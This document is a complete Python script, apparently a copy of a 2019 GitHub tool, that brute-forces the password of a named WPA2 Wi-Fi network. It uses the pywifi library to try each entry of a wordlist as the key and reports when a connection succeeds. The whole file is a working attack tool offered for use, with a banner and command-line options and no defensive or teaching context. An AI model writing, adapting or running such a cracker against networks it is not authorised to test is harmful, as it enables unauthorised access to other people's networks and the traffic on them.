import argparse
import os
import platform
import re
import sys
import time

import pywifi
from pywifi import const, Profile

# Colores para la salida en consola
RED = "\033[1;31m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD = "\033[;1m"
REVERSE = "\033[;7m"

def check_dependencies():
    try:
        import pywifi
        from pywifi import PyWiFi
        from pywifi import const
        from pywifi import Profile
    except ImportError:
        print("[-] pywifi module is not installed. Please install it.")
        sys.exit(1)

def initialize_wifi():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    return iface

def connect_to_network(iface, ssid, password):
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    time.sleep(0.1)  # Ajustado tiempo de espera
    iface.connect(tmp_profile)
    time.sleep(0.35)  # Ajustado tiempo de espera

def check_connection_status(iface):
    return iface.status() == const.IFACE_CONNECTED

def crack_wifi(iface, ssid, wordlist):
    with open(wordlist, 'r', encoding='utf8') as words:
        for number, line in enumerate(words, start=1):
            pwd = line.strip()  # Eliminar caracteres de nueva línea
            connect_to_network(iface, ssid, pwd)
            if check_connection_status(iface):
                print(BOLD, GREEN, f'[*] Crack success! Password is {pwd}', RESET)
                return
            else:
                print(RED, f'[{number}] Crack Failed using {pwd}')

def parse_arguments():
    parser = argparse.ArgumentParser(description='Crack WiFi using PyWiFi')
    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID of the WiFi network')
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='Path to the password wordlist file')
    parser.add_argument('-v', '--version', action='store_true', help='Display version information')
    return parser.parse_args()

def display_version_info():
    print("\n\n", CYAN, "by Brahim Jarrar\n")
    print(RED, " github", BLUE, " : https://github.com/BrahimJarrar/\n")
    print(GREEN, " CopyRight 2019\n\n")
    sys.exit(0)

def clear_screen():
    if platform.system().startswith("Win" or "win"):
        os.system("cls")
    else:
        os.system("clear")

def crack_wifi_pswd_main():
    
    check_dependencies()
    iface = initialize_wifi()
    clear_screen()
    banner()
    print("****************************************************************")
    args = parse_arguments()

    if args.version:
        display_version_info()

    ssid = args.ssid or input("[*] SSID: ")
    wordlist = args.wordlist or input("[*] Passwords file: ")

    if not os.path.exists(wordlist):
        print(RED, "[-] No such file:", BLUE, wordlist)
        sys.exit(1)

    print(BLUE, "[~] Cracking...")
    crack_wifi(iface, ssid, wordlist)

def banner():
    cartel = r"""
    ___             _    __      ___ ___ _   ___              _ 
   / __|_ _ __ _ __| |__ \ \    / (_) __(_) | _ \____ __ ____| |
  | (__| '_/ _` / _| / /  \ \/\/ /| | _|| | |  _(_-< V  V / _` |
   \___|_| \__,_\__|_\_\   \_/\_/ |_|_| |_| |_| /__/\_/\_/\__,_|
                                                                
    """
    print(cartel)

if __name__ == "__main__":
    crack_wifi_pswd_main()
